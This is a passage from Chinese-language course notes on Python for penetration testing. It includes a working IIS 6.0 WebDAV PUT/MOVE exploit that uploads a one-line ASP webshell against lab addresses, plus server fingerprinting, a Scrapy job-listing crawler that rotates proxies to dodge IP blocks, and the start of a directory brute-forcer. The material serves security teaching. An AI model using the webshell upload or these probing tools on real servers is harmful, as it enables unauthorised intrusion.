构造请求url，指定⽊⻢保存的⽂件

```python
# ⽊⻢保存的⽂件
target_file = url + "/webshell.txt"
```

执⾏PUT请求，获取返回response状态码，根据状态码判断⽊⻢⽂件是否⽣成成功。

```python
resp = requests.put(target_file, headers=headers, data=data)
print(type(resp.status_code))
# 判断返回的状态码，第⼀次上传是201，如果重复上传是200
if resp.status_code == 200 or resp.status_code == 201:
	print("⽊⻢⽂件上传成功！")
```

⽬前，我们的⽊⻢⽂件是txt⽂本⽂件，⽹站请求这个⽂件是⽆法执⾏⾥⾯的代码的，我们需要将⽂件转换为asp可执⾏的脚本⽂件，这样我们后⾯使⽤⼯具链接这个asp⽂件的时候，就可以获得WebShell权限。

在headers中添加⼀个key，意义在于，在⽬标服务器中，将webshell.txt重命名为`webshell.asp;.jpg`

```
headers["Destination"] = "/webshell.asp;.jpg"
```

python的requests库是没有单独的MOVE⽅法，但是requests可以⾃定义请求⽅法，下⾯构造MOVE请求⽅法，并获取它返回的状态码进⾏判断。

```python
resp = requests.request("MOVE", target_file, headers=headers, data=data)
# 判断状态码是否为207，207 Multi-Status是WebDAV扩展的状态码，代表之后的消息体将是⼀个XML消息
if resp.status_code == 207:
	print("⽊⻢⽂件改为脚本⽂件修改成功，成功获得WebShell权限！")
```

⾄此，使⽤python获取IIS写权限漏洞，并上传⽊⻢⽂件成功。后⾯可以使⽤链接⼯具去进⾏测试，因为本篇主讲python，这⾥不再演示链接⼯具的使⽤。

#### 练习

```python
import requests


def get_response(url):
    """发送GET请求并返回响应对象"""
    resp = requests.get(url)
    return resp


def print_status_and_headers(resp):
    """打印HTTP状态码和头部信息"""
    if resp.status_code in [200, 201]:
        print("当前IIS服务正在运行")
    print("打印响应体的headers：", resp.headers)


def check_iis_version(resp):
    """检查IIS版本是否为6.0"""
    server_header = resp.headers.get("Server", "")
    if "Microsoft-IIS/6.0" in server_header:
        print("当前服务器IIS版本为6.0")


def options_response(url):
    """发送OPTIONS请求并返回响应对象"""
    resp = requests.options(url)
    return resp


def print_options_headers(resp):
    """打印OPTIONS请求的响应头部信息"""
    print("打印响应体的headers:", resp.headers)


def check_put_move_vulnerability(resp):
    """检查是否存在PUT和MOVE漏洞"""
    public = resp.headers.get("Public", "")
    allow = resp.headers.get("Allow", "")
    if "PUT" in public and "MOVE" in public or "PUT" in allow and "MOVE" in allow:
        print("当前IIS服务器可能存在PUT和MOVE的漏洞")


def put_file(url, headers, payload):
    """尝试使用PUT方法上传文件"""
    resp = requests.put(url=url, headers=headers, data=payload)
    if resp.status_code in [200, 201]:
        print("向IIS服务器上传文件成功")


def move_file(url, headers, payload):
    """尝试使用MOVE方法移动文件"""
    resp = requests.request(method="MOVE", url=url, headers=headers, data=payload)
    if resp.status_code == 207:
        print("向IIS服务器上传一句话木马成功")


def main():
    url = "http://192.168.70.6/index.html"

    # GET
    resp = get_response(url)
    # print_status_and_headers(resp)
    check_iis_version(resp)

    # OPTIONS
    resp = options_response(url)
    # print_options_headers(resp)
    check_put_move_vulnerability(resp)

    headers = {
        "Host": "219.153.49.228:43068",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Content-Length": "25"
    }

    # PUT
    target_url = "http://192.168.70.6"
    target_file = "/index.txt"
    url = target_url + target_file
    payload = "<% eval request(\"mima\") %>"

    put_file(url, headers, payload)

    # MOVE
    headers["Destination"] = "/index.asp;.jpg"

    move_file(url, headers, payload)


if __name__ == "__main__":
    main()

```



### **九、Python获取HTTP服务器信息**

#### **1.获取中间件信息**

本节将以IIS和Apache为例，⾸先，我们打开对应的服务器（Windows server 2003）。

⾸先开启了`IIS`，并且查看⼀下⽬标的IP地址，可以看到他的IP地址是192.168.3.115.

下⾯进⾏编写代码，来获取⽬标服务器的中间件信息。

```python
#server_info.py
import requests
url = 'http://192.168.70.6:8080'
resp = requests.get(url)
print(resp.headers)
# IIS PUT漏洞
# print("服务器中间件为：%s" % resp.headers["Server"])
# print("程序脚本语⾔为：%s" % resp.headers["X-Powered-by"])
print("服务器中间件采⽤技术为：%s" % resp.headers["Server"])
print("应⽤程序脚本语⾔为：%s" % resp.headers["X-Powered-by"])
```

执⾏结果

```python
{'Content-Type': 'text/html', 'Server': 'Microsoft-IIS/10.0', 'X-Powered-By': 'ASP.NET', 'WWW-Authenticate': 'Basic realm="192.168.3.53"', 'Date': 'Tue, 19 Mar 2024 23:26:41 GMT', 'Content-Length': '1181'}
```

从输出结果中可以看到，在server头参数中，可以获得对应的服务器信息，可以看到使⽤的是IIS10.0，这是它中间件使⽤IIS，并且版本是10.0。同时它的X-Powered-By头参数也暴露出，它使⽤的脚本技术是asp.net。

这时候，我们就可以直接输出以下内容：

- 服务器中间件采⽤技术为：`Microsoft-IIS/10.0`
- 应⽤程序脚本语⾔为：`ASP.NET`

以上就是通过Python脚本获取了对应IIS服务器中间件版本，以及对应的程序脚本语⾔。

#### **2.**获取脚本信息

接下来演示**Apache**获取对应的服务器中间件以及它对应的版本信息，同时获取它采⽤的脚步技术。

⾸先要关闭IIS，这是由于`Apache`使⽤的端⼝是80，`IIS`也使⽤的80，两者同时启动会发⽣冲突，当然也可以修改其中任意⼀个中间件，使⽤其他端⼝，从⽽避免冲突发⽣。这⾥就不做修改了，直接将IIS关掉之后启动Apache。

启动完成后，执⾏python脚本，同样进⾏访问

```python
# server_info.py
import requests

url = 'http://192.168.70.6:8080'
resp = requests.get(url)
print(resp.headers)

print("服务器中间件采⽤技术为：%s" % resp.headers["Server"])
# print("应⽤程序脚本语⾔为：%s" % resp.headers["X-Powered-by"])
```



```json
{'Date': 'Tue, 19 Mar 2024 23:36:11 GMT', 'Server': 'Apache/2.4.58 (Win64)', 'LastModified': 'Mon, 11 Jun 2007 12:53:14 GMT', 'ETag': '"2e-432a0dd316280"', 'Accept-Ranges': 'bytes', 'Content-Length': '46', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'KeepAlive', 'Content-Type': 'text/html'}
```

这时候就会输出当前URL访问Apache服务响应的请求头参数，可以看到，这⾥有个server对应的响应头，在这⾥输出了对应的中间件名称，以及版本信息，同时包含系统类型，可以看出当前软件是在Windows64位系统上运⾏的，那表明，Apache下载的版本是基于Windows开发的2.4版本。如果当前⽹站运⾏的是PHP编写的⽂档类型，那么还会显示`PHP`的版本信息，这⾥就不做演示了。

我们可以在程序中输出这些关键信息

```python
print("服务器中间件采⽤技术为：%s" % resp.headers["Server"])
#输出结果：服务器中间件采⽤技术为：Apache/2.4.58 (Win64)
```

以上就是通过Python获取了HTTP服务器中的信息，获取到了中间件信息以及脚本信息，咱们都是通过响应头当中的内容来进⾏获取。



#### 练习：apche和dvwa信息

```python
# APACHE
def Apache_info() :
    import requests

    url = 'http://192.168.70.6:8080'
    resp = requests.get(url)
    print(resp.headers)

    print("服务器中间件采⽤技术为：%s" % resp.headers["Server"])
    # print("应⽤程序脚本语⾔为：%s" % resp.headers["X-Powered-by"])

#DVWA
def DVWA_info() :
    import requests

    url = "http://192.168.70.10:8085/login.php"

    resp = requests.get(url)
    print(resp.headers)

    service = resp.headers.get("Server")
    print("当前WEB服务器版本为:",service)
    poweredBy=resp.headers.get("X-Powered-By")
    print("当前网址的开发语言是:",poweredBy)

if __name__ == '__main__':
    # Apache_info()
    DVWA_info()
```



## **第九节** Python Scrapy爬⾍实战

### **⼀、Python scrapy介绍与安装**

本节内容将认识Python第三⽅爬⾍库scrapy，同时也会介绍，在Linux下进⾏对应的安装，在Windows下可能存在⼀些问题。

#### **1.第三⽅库scrapy**

那⾸先给⼤家介绍scrapy究竟是什么？

1. （1）scrapy是⼀个⽤于**抓取web站点**和**提取结构化数据**的应⽤程序**框架**，可⼴泛的⽤于应⽤程序，如**数据挖掘**、**信息处理**或**历史存档**。
2. （2）尽管scrapy最初是为web抓取⽽设计的，但它也可以使⽤API（如Amazon associates web service）或通⽤web爬⾍程序来提取数据。

⾸先它是Python的⼀个第三⽅库，那么这样⼀个`scrapy`库是⽤于抓取web站点和提取结构化数据的应⽤程序框架，

它可⽤于⼴泛的应⽤程序，是⾮常具有兼容性，在进⾏数据挖掘、信息处理或历史存档时特别⾼效。

##### Scrapy 框架由五⼤组件构成：

![image-20240813101620820](https://image.201068.xyz/assets/21.Python/image-20240813101620820.png)

在整个执⾏过程中，还涉及到两个 `middlewares` 中间件，分别是**下载器中间件**（`Downloader Middlewares`）和**爬⾍中间件**（`Spider Middlewares`），它们分别承担着不同的作⽤：

![image-20240813103338391](https://image.201068.xyz/assets/21.Python/image-20240813103338391.png)

#### **2.scrapy爬⾍⼯作流程**

![image-20240813103444619](https://image.201068.xyz/assets/21.Python/image-20240813103444619.png)

> 1.引擎找到spider爬虫，在spider中找到起始url（第⼀个待爬取的 URL）。
>
> 2.起始url被引擎包装成request对象。
>
> 3.引擎将reques对象传递给调度器。
>
> 4.调度器（Scheduler）通过引擎将response对象传递给Downloader下载器。
>
> 5.Downloader下载器将得到的response对象通过引擎送回给spider爬虫。
>
> 6.spider爬虫解析：解析返回的response对象，通过xpath、json、re、css等。
>
> 7.spider将数据通过引擎传递给pipeline管道，存储数据。若有新的url（⽐如下⼀⻚等）：重复2-7步骤。

#### **3.Windows**下安装

安装⽅式同Linux下安装，除了没⽤命令⾏，其他都⼤体⼀致。

#### **4.Linux下安装**

使⽤ubuntu 18进⾏安装。

接下来要使⽤Python3进⾏对应的开发，毕竟Python2在2020年之后就不再进⾏维护，未来是属于Python3的，由于Ubuntu Linux并没有安装Python3，那么我们只需要安装anaconda，这个软件它⾃带python。

##### **(1)安装anaconda⼯具**

第⼀步，安装**anaconda**

```bash
#下载安装anaconda脚本
wget https://repo.anaconda.com/archive/Anaconda3-2024.02-1-Linux-x86_64.sh

#安装
cd Downloads/
chmod +x Anaconda3-2024.02-1-Linux-x86_64.sh
sh Anaconda3-2024.02-1-Linux-x86_64.sh

#结束之后，需要使conda环境变量⽣效

source ~/.bashrc
#shell命令⾏提示符变为(base) kevin@kevin-Parallels-Virtual-Platform就按装成功了

#运⾏anaconda UI界⾯，使⽤下⾯命令：
anaconda-navigator
```

第⼆步，配置⼀个python运⾏环境，点击左侧栏⽬的Environments标签

第三步，点击下⾯的Create图标

第四步，在弹出的对话框中，输⼊name：pentest，Python前⾯多选框打钩，选择3.12.2版本，最后点击Create按钮进⾏创建环境

第五步，点击刚创建的pentest标签，后⾯有⼀个⼩图标就代表已经切换到pentest环境中

##### **(2)安装Scrapy模块**

第⼀步，在pentest环境中，点击右侧的搜索框输⼊scrapy，找到scrapy后选中，点击下⾯的Apply

第⼆步，打开pycharm，新建⼀个项⽬，然后import scrapy是否成功,如果有提示scrapy，说明scrapy模块安装成功。

第三步，测试scrapy是否可以正常使⽤

运⾏这个gotest.py，可以看到输出了scrapy的版本号2.11.1，和在pentest环境中安装的scrapy版本⼀致，说明当前环境配置正确。

#### **5.Scrapy命令介绍**

在安装Scrapy模块后，就会⾃动在pentest的Python环境中，⽣成⼀个scrapy的命令。这时候，可以通过scrapy在

命令⾏进⾏爬⾍⼯程创建。在当前环境变量下，输⼊scrapy命令，会⾃动输出命令的帮助信息。

```bash
#进⼊pentest环境中
conda activate pentest

#查看scrapy命令帮助
(pentest) kevin@virtual-ubuntu:~$ scrapy -h
Scrapy 2.11.1 - no active project
Usage:
 scrapy <command> [options] [args]
Available commands:
 bench Run quick benchmark test
 fetch Fetch a URL using the Scrapy downloader
 genspider Generate new spider using pre-defined templates
 runspider Run a self-contained spider (without creating a project)
 settings Get settings values
 shell Interactive scraping console
 startproject Create new project
 version Print Scrapy version
 view Open URL in browser, as seen by Scrapy
 [ more ] More commands available when run from project directory
Use "scrapy <command> -h" to see more info about a command
```

以上就是关于Python scrapy的介绍与安装。这⾥着重强调，建议在Linux环境中进⾏开发，兼容性更好，更容易搭

建好相应的环境，并且运⾏的时候也不容易出现⼀些兼容问题。

### **⼆、Scrapy创建⼯程**

本节内容是通过scrapy命令在命令⾏创建⼀个爬⾍⼯程。

#### **1.创建⼯程**

```python
#创建命令，如果不加⼯程⽬录的话，默认是在当前⽬录下创建
scrapy startproject ⼯程名 [⼯程⽬录]

#查看帮助
(pentest) kevin@virtual-ubuntu:~$ scrapy startproject -h
Usage
=====
 scrapy startproject <project_name> [project_dir]
Create new project
Options
=======
-h, --help show this help message and exit
Global Options
--------------
--logfile FILE log file. if omitted stderr will be used
-L LEVEL, --loglevel LEVEL
 log level (default: DEBUG)
--nolog disable logging completely
--profile FILE write python cProfile stats to FILE
--pidfile FILE write process ID to FILE
-s NAME=VALUE, --set NAME=VALUE
set/override setting (may be repeated)
--pdb enable pdb on failure

#在~/PycharmProjects⽬录下创建⼀个test1⼯程
scrapy startproject test1 ~/PycharmProjects/test1

#以下是shell命令⾏执⾏并输出的结果内容
(pentest) kevin@virtual-ubuntu:~$ scrapy startproject test1 ~/PycharmProjects/test1
New Scrapy project 'test1', using template directory 
'/home/kevin/anaconda3/envs/pentest/lib/python3.12/sitepackages/scrapy/templates/project', created in:
 /home/kevin/PycharmProjects/test1

You can start your first spider with:
cd /home/kevin/PycharmProjects/test1
 scrapy genspider example example.com
#上⾯输出提示：新的scrapy项⽬test1在/home/kevin/PycharmProjects/test1⽬录下⽣成成功
#你可以开始你的第⼀个爬⾍，进⼊/home/kevin/PycharmProjects/test1项⽬⽬录
#然后执⾏scrapy genspider example example.com
#genspider表示⽣成爬⾍，example表示爬⾍名称，可以对应爬取⽹址域名的前缀，example.com是要爬取的⽹址
```

#### **2.⼯程⽂件作⽤**

```bash
#进⼊⼯程⽬录
cd /home/kevin/PycharmProjects/test1

#查看⾥⾯的⽂件和⽬录
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1$ ls
scrapy.cfg test1
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1$ cd test1
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1/test1$ ls | xargs -l
__init__.py
items.py
middlewares.py
pipelines.py
settings.py
spiders
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1/test1$ cd spiders/
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1/test1/spiders$ ls
__init__.py
```

> `scrapy.cfg`是最终部署爬⾍的配置⽂件
>
> `items.py`设置要爬取的字段
>
> `pipelines.py`设置保存爬取内容
>
> `settings.py`设置⽂件，⽐如User-Agent
>
> `spiders`⽬录保存genspider⽣成的爬⾍⽂件

#### **3.创建爬⾍**

```bash
#回到项⽬⽬录下
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1$ ls
scrapy.cfg test1

#⽣成爬⾍⽂件
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1$ scrapy genspider tencent tencent.com
Created spider 'tencent' using template 'basic' in module:
 test1.spiders.tencent
 
 #进⼊spider⽬录，并查看
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1$ cd test1/spiders/
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1/test1/spiders$ ls
__init__.py __pycache__ tencent.py
#可以看到⽣成了tencent.py⽂件，查看它的内容
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/test1/test1/spiders$ cat tencent.py 
import scrapy
class TencentSpider(scrapy.Spider):
 name = "tencent"
 allowed_domains = ["tencent.com"]
 start_urls = ["https://tencent.com"]
 def parse(self, response):
 pass
#可以看到，这个⽂件⽣成了⼤体的结构，通过结合items.py, pipelines.py和settings.py去开始编写爬⾍
```



#### 练习

```bash
conda init
conda info --env
conda env list

d:
cd D:\codes\python_codes\python_workspace\pentest

conda activate pentest


1.创建一个爬虫工程
scrapy startproject Tencent D:\codes\python_codes\python_workspace\pentest

2.进入工程目录，生成爬虫类
cd Tencent
scrapy genspider tencentPosition "tencent.com"

3.基础配置，配置user-agent,开启下载中间件，开启管道中间件
#settions将默认user-agent取消
USER_AGENTS = [
    ...]

DOWNLOADER_MIDDLEWARES = {
"scrapy.downloadermiddleware.useragent.UserAgentMiddleware": None,
"Tencent.middlewares.TencentDownloaderMiddleware": 543,
}

ITEM_PIPELINES = {
"Tencent.pipelines.TencentPipeline": 300,
}

4.在下载中间件的类里包装request对象的headers
# middlewares设置随机user-agent
from Tencent import settings

class TencentDownloaderMiddleware:

    def process_request(self, request, spider):
        ua = random.choice(settings.USER_AGENTS)
        request.headers['User-Agent'] = ua

        return None

5.分析要爬取的目标网站，观察那个连接会产生结构化数据

6.得到第一个URL后分析URL参数

7.测试验证修改这些参数是否正确（postman）

8.定义item类的逻辑，定义要保存的字段


9.定义爬虫类逻辑，首先把start_urls定义好了

10.解析response的对象，将要保存字段赋值给item对象

11.将item对象返回给引擎（yield item）

12.在管道符模块里，在init方法定义数据保存方式

13.将item对象

启动爬虫
scrapy crawl tencentPosition
```



### **三、案例介绍**

利⽤Python scrapy开发爬⾍的案例，从开发的过程中，能够直观的了解和理解Python scrapy爬⾍开发⽤到的技术，以及整个流程。

#### **1.爬⾍⽬标**

开发爬⾍，⾸先要确定⽬标⽹站的⻚⾯，以及对应⻚⾯的具体内容，接下来的案例，要爬取**腾讯的招聘职位信息**。

**⽬标⽹址**：https://careers.tencent.com/search.html

分析⻚⾯可以知道⼀些有规律的⽹⻚结构，以及⽹⻚内容的json数据。

#### **2.爬取字段**

职位信息：

```bash
# 职位id
positionId
# 职位名称
positionName
# 职位类型
positionType
# 国家
positionCountry
# ⼯作地
positionSite
# 事业群
positionBG
# ⼯作年限
positionExperience
# 发布时间
positionTime
# 岗位职责
positionResponsibility
# 详情链接
positionUrl
```

以上是将要爬取的字段内容，在开发中要对这些字段取⼀个英⽂名称，因为在后⾯开发抓取了对应的内容，要使⽤对应的变量进⾏存储。



##### 练习

![image-20240814182920771](https://image.201068.xyz/assets/21.Python/image-20240814182920771.png)

![image-20240814183004142](https://image.201068.xyz/assets/21.Python/image-20240814183004142.png)

![image-20240814183256044](https://image.201068.xyz/assets/21.Python/image-20240814183256044.png)

![image-20240814183230357](https://image.201068.xyz/assets/21.Python/image-20240814183230357.png)

```python
import requests
import json
import time
import urllib3

# 忽略InsecureRequestWarning警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#时间戳
def get_timestamp():
    return int(time.time() * 1000)

# 获取招聘信息
def fetch_job_data(page_index, page_size=10):
    base_url = "https://careers.tencent.com/tencentcareer/api/post/Query"
    params = {
        "timestamp": get_timestamp(),
        "countryId": "",
        "cityId": "",
        "bgIds": "",
        "productId": "",
        "categoryId": "",
        "parentCategoryId": "",
        "attrId": "",
        "keyword": "",
        "pageIndex": page_index,
        "pageSize": page_size,
        "language": "zh-cn",
        "area": "cn"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }

    proxies = {
        "http": "http://{}".format(requests.get("http://proxy.201068.xyz:5010/get/?type=http").json().get('proxy')),
    }

    response = requests.get(base_url, headers=headers, params=params, proxies=proxies, verify=False)

    if response.status_code == 200:
        data = response.json()
        if data.get("Code") == 200:
            return data["Data"]["Posts"]
        else:
            print(f"Error in response data: {data}")
    else:
        print(f"Failed to fetch data from page {page_index}: {response.status_code}")

    return []

# 保存数据到文件
def save_jobs_to_file(job_list, filename="tencent_jobs.json"):
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(job_list, f, ensure_ascii=False, indent=4)
    print(f"Data saved to {filename}")

# 主函数
def main():
    total_pages = 278
    all_jobs = []

    for page in range(1, total_pages + 1):
        print(f"Fetching page {page}/{total_pages}...")
        jobs = fetch_job_data(page_index=page)
        if jobs:
            for job in jobs:
                job_info = {
                    "JobTitle": job.get("RecruitPostName"),
                    "Location": job.get("LocationName"),
                    "BGName": job.get("BGName"),
                    "LastUpdateTime": job.get("LastUpdateTime"),
                    "JobURL": job.get("PostURL"),
                    "Experience": job.get("RequireWorkYearsName"),
                    "Responsibility": job.get("Responsibility")
                }
                all_jobs.append(job_info)
        else:
            print(f"No data found for page {page}")
            break

    save_jobs_to_file(all_jobs)

if __name__ == "__main__":
    main()

```

![image-20240814182820381](https://image.201068.xyz/assets/21.Python/image-20240814182820381.png)

#### 3.初始化⼯程

##### (1)创建⼯程

```bash
#创建⼯程
scrapy startproject Tencent ~/PycharmProjects/Tencent
#执⾏结果
(pentest) kevin@virtual-ubuntu:~$ scrapy startproject Tencent ~/PycharmProjects/Tencent
New Scrapy project 'Tencent', using template directory 
'/home/kevin/anaconda3/envs/pentest/lib/python3.12/sitepackages/scrapy/templates/project', created in:
 /home/kevin/PycharmProjects/Tencent
You can start your first spider with:
cd /home/kevin/PycharmProjects/Tencent
 scrapy genspider example example.com
```

##### **(2)items.py添加爬取字段**

使⽤pycharm打开⼯程Tencent，修改项⽬的Python解释器，改为pentest环境。编辑items.py，新增如下内容：

```python
class TencentItem(scrapy.Item):
  # define the fields for your item here like:
  # name = scrapy.Field()
  # 职位id
  positionId = scrapy.Field()
  # 职位名称
  positionName = scrapy.Field()
  # 职位类型
  positionType = scrapy.Field()
  # 国家
  positionCountry = scrapy.Field()
  # ⼯作地
  positionSite = scrapy.Field()
  # 事业群
  positionBG = scrapy.Field()
  # ⼯作年限
  positionExperience = scrapy.Field()
  # 发布时间
  positionTime = scrapy.Field()
  # 岗位职责
  positionResponsibility = scrapy.Field()
  # 详情链接
  positionUrl = scrapy.Field()
```

TencentItem这个类表示⽤它来存储爬取到每⼀条职位信息对应字段的值，它继承的是scrapy.Item，这个是必须继承的，否则这些字段的值是⽆法保存到⾃定义的变量⾥⾯的。

##### **(3)**创建基础爬⾍类

```bash
#操作命令
scrapy genspider tencentPosition "tencent.com"
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/Tencent$ scrapy genspider tencentPosition 
"tencent.com"
Created spider 'tencentPosition' using template 'basic' in module:
 Tencent.spiders.tencentPosition
```

tencentPosition为爬⾍名，tencent.com为爬⾍作⽤范围，执⾏上⾯命令后，会在spiders⽬录下创建⼀个tencentPosition.py⽂件，这个⽂件是最终要编写爬⾍内容的⽂件。

打开⽂件看内容：

```bash
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/Tencent/Tencent/spiders$ cat tencentPosition.py 

import scrapy
class TencentpositionSpider(scrapy.Spider):
 name = "tencentPosition"
 allowed_domains = ["tencent.com"]
 start_urls = ["https://tencent.com"]
 def parse(self, response):
 pass
```

`TencentpositionSpider`类是继承scrapy.Spider这个类，表示⽤来爬⾍，name是它的属性，设置为tencentPosition。

`allowed_domains`表示要爬取的域名tencent.com，start_url表示是它初始化的url，⽤⼀个列表存储，start_url的值是要进⾏修改的，不然跟⽬标爬⾍⽹址不⼀样。

parse⽅法⽤来对⽹⻚内容进⾏分析处理。

### **四、初始与结束条件**

修改`TencentpositionSpider`类，完成初始与结束条件。

#### **1.初始化URL**

原始⻚⾯URL：

```
https://careers.tencent.com/search.html?index=
```

爬⾍爬取数据URL：

```
https://careers.tencent.com/tencentcareer/api/post/Query?&pageSize=10&language=zh-cn&area=cn&pageIndex=
```

pageIndex初始为1，每翻⼀⻚pageIndex+1

爬⾍初始化URL：startUrl = [url + pageIndex]

#### **2.结束条件**

https://careers.tencent.com/search.html?index=293

`pageIndex < 293`

#### **3.循环爬取**

每次处理完⼀⻚数据后，重新发送下⼀⻚⻚⾯请求

```
yield scrapy.Request(self.url + str(self.index), callback = self.parse)
```

> 问题描述：
>
> 在使⽤scrapy默认⽣成的框架⽂件时遇到 Signature of method ‘XXXX.parse()’ does not match signature of  the base method in class ‘Spider’ 或者是 ⽅法 ‘XXXX.parse()’ 的签名与类 ‘Spider’ 中基⽅法的签名不匹配。
>
> 
>
> 解决⽅案：
>
> 在response后添加 `*args`, `**kwargs`即可。
>
> 
>
> 原因分析：
>
> 在继承⽗类的时候，有些⽗类函数是必须要重写的，重写的时候的函数参数有规定（这个函数参数形式的规定也叫函数签名），你重写这个函数的时候参数与要求的不⼀致所以会报错，解决⽅案就是按照要求修改参数就⾏，也就是需要加上后⾯两个参数。

### **五、初始化item对象**

初始化item对象，完成parse⽅法。

#### **1.类中调⽤⾃身属性和⽅法**

```
self.属性名
self.⽅法名
```

#### **2.循环读取⾏**

因为请求的URL返回的消息体是⼀个json body，需要将它解码后才可以读取它内部的key与value，也就是我们需要的各种信息。

```
respData = response.text
jsonBody =json.loads(respData)
```

![image-20240813111114105](https://image.201068.xyz/assets/21.Python/image-20240813111114105.png)

#### **3.循环读取列**

##### **(1)**初始化item对象

```
from Tencent.items import TencentItem
item=TencentItem()
```

##### **(2)获取职位信息**

```PYTHON
try:
    item["positionId"] = post["PostId"]
    item["positionName"] = post["RecruitPostName"]
    item["positionBG"] = post["BGName"]
    item["positionCountry"] = post["CountryName"]
    item["positionSite"] = post["LocationName"]
    item["positionType"] = post["CategoryName"]
    item["positionResponsibility"] = post["Responsibility"]
    item["positionTime"] = post["LastUpdateTime"]
    item["positionExperience"] = post["RequireWorkYearsName"]
    item["positionUrl"] = post["PostURL"]
except json.decoder.JSONDecodeError as e:
	continue
#为什么⽤try except？⽤于捕获异常，假如有⼀个key的值是空的，那么程序就会有异常报错，并且会⾃动退出，影响后续的数据爬取。
#使⽤try except捕获json解码异常，当出现异常的时候，跳过不去读取当前的职位信息
```

### **六、保存爬取数据**

要保存数据，⾸先要在pipeline中打开数据，然后将数据保存到⽂件，之后有⼀个关闭⽂件的函数，最后要关闭⽂

件。

#### **1.打开⽂件**

在pipelines.py中将内容保存到⽂件中。

在初始化⽅法`__init__`中加⼊`self.filename = open("tencent.json", "w")`

#### **2.保存数据到⽂件**

```python
import json
text = json.dum(dict(item), ensure_ascii = False) + ",\n"
#将item数据转换为字段对象，然后再保存为json
#ensure_ascii表示存储中⽂时不使⽤ASCII码，否则会乱码
self.filename.write(text)
```

#### **3.关闭⽂件**

⽂件读取完毕后，记得关闭⽂件流

```python
def close_spider(self, spider):
	self.filename.close()
```

### **七、设置⽂件配置**

爬⾍运⾏的设置是在settings.py⽂件中

#### **1.设置请求头**

设置⾃定义请求头的⼀些参数

```python
DEFAULT_REQUEST_HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
}
```

#### **2.设置item-pipelines**

取消原有的注释即可

```python
ITEM_PIPELINES = {
	"Tencent.pipelines.TencentPipeline": 300,
}
```

#### **3.设置代理IP**

由于爬⾍是⼀种对源站⽹络资源请求相对密集的访问，⽹站⼀般都会对这种异常访问进⾏限制，可能直接会把访问的IP地址封锁，以达到截断异常的⽹络访问。这时候，客户端为了防⽌曝露⾃⼰本地真实IP地址，通常爬⾍⼯程会加⼊IP代理，达到爬取数据的⽬的。

```python
#在爬⾍DownloaderMiddleware的process_request⽅法中加⼊
request.meta['proxy'] = "http://ip:port"
```

### **⼋、执⾏命令，爬取数据**

```bash
#操作命令
scrapy crawl tencentPosition
#执⾏步骤
(base) kevin@virtual-ubuntu:/opt$ conda activate pentest
(pentest) kevin@virtual-ubuntu:/opt$ cd ~/PycharmProjects/Tencent/
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/Tencent$ cd Tencent/
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/Tencent/Tencent$ ls
__init__.py middlewares.py __pycache__ spiders items.py pipelines.py settings.py
(pentest) kevin@virtual-ubuntu:~/PycharmProjects/Tencent/Tencent$ scrapy crawl 
tencentPosition
#爬取结束
2024-03-17 11:12:34 [scrapy.core.engine] INFO: Spider closed (finished)
```

## **第⼗节** Python基于字典的⽬录资源探测⼯具编写

### **⼀、介绍**

#### **1.⼯具原理**

通过**读取字典⽂件获取内容**并**拼接URL**，然后执⾏`HTTP GET`请求，获取**响应状态码**，根据状态码判断⽬录⽂件资源是否存在。

#### **2.⼯具思路**

命令⾏⼯具参数获取

字段读取

多线程访问

通过状态码判断输出结果

结果分析

### **⼆、⼯具初始化**

#### **1.Banner信息函数**

```python
#定义函数，⽤于介绍⼯具与名称
def banner():
    print("*" * 51)
    print("*" * 2 + " " * 17 + "Dirbrute v1.0" + " " * 17 + "*" * 2)
    print("*" * 51)
	print("This tool just develop for education!")
```

对于banner信息，还可以添加其他内容，但是它的⽬的就是为了介绍⼯具以及其名称，同时也介绍这个软件设计的⽬的和免责信息。

#### **2.使⽤⽅法信息函数**

```python
#使⽤⽅法函数，⽤于介绍⼯具怎么使⽤
def usage():
    print("This is the tool's usage")
    print("python dir_brute.py -u url -t thread_num -d dic.txt")
#1.url
#2.thread
#3.dictionary
```

当前的⼯具主要是⽤来url的探测，探测其对应的⽬录和⽂件，

最主要传递的内容⾸先是`url`，是⽬标的站点地址。

第⼆个是`thread`，使⽤多**线程**来运⾏探测程序。

第三个是`dictionary`字典⽂件，因为是基于字典进⾏破解，所以要传递字典。

### **三、命令⾏⼯具参数获得**

#### **1.optparse模块介绍**

`optparse`库是Python⽤于**读取命令⾏的集成模块**。

```python
# 1.导⼊optparse
import optparse

# 2.初始化optparse.OptionParse()
parser = optparse.OptionParser()

# 3.设置初始对象的usage属性，告诉使⽤者命令该如何使⽤
parser.usage = "python dir_brute.py -u url -t thread_num -d dic.txt"

# 4.添加参数，-u或者--url，help帮助信息，action动作是存储，参数类型是string，dest⽬的是存储在变量url中，metavar表示元变量，它只会在帮助信息⾥显示，如果不指定则使⽤默认值，参照dest值是⼤写的URL
